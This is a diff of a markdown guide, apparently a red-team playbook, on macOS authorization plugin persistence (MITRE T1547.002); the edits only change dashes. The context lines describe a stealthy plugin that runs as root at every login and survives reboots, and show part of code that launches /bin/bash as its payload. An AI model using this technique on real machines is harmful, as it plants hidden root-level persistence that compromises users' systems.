@@ -1,8 +1,8 @@
 # macOS Authorization Plugin Persistence
 
-Create an authorization plugin that executes during login — high stealth, survives reboots.
+Create an authorization plugin that executes during login - high stealth, survives reboots.
 
-**MITRE ATT&CK**: T1547.002 — Authentication Package  
+**MITRE ATT&CK**: T1547.002 - Authentication Package  
 **Severity**: CRITICAL (code runs at login as root)
 
 ---
@@ -68,7 +68,7 @@ static OSStatus MechanismCreate(AuthorizationPluginRef inPlugin,
 }
 
 static OSStatus MechanismInvoke(AuthorizationMechanismRef inMechanism) {
-    // Payload executes here — runs as root during login
+    // Payload executes here - runs as root during login
     @autoreleasepool {
         NSTask *task = [[NSTask alloc] init];
         [task setLaunchPath:@"/bin/bash"];
